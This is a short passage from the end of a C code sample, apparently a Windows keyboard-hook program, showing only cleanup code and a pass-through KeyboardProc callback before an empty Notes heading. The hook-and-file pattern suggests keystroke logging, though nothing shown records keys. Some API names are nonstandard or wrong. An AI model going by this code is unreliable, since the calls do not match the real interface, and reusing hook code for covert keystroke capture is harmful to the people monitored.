            return 0;
        }
    }

    // Cleanup
    UnhookKeyboard(hook);
    if (file) {
        fclose(file);
    }

    return 0;
}

// Function to handle keyboard events
LRESULT CALLBACK KeyboardProc(int code, int wParam, LPARAM lParam) {
    return CallNextHook(code, wParam, lParam);
}
```

### Notes

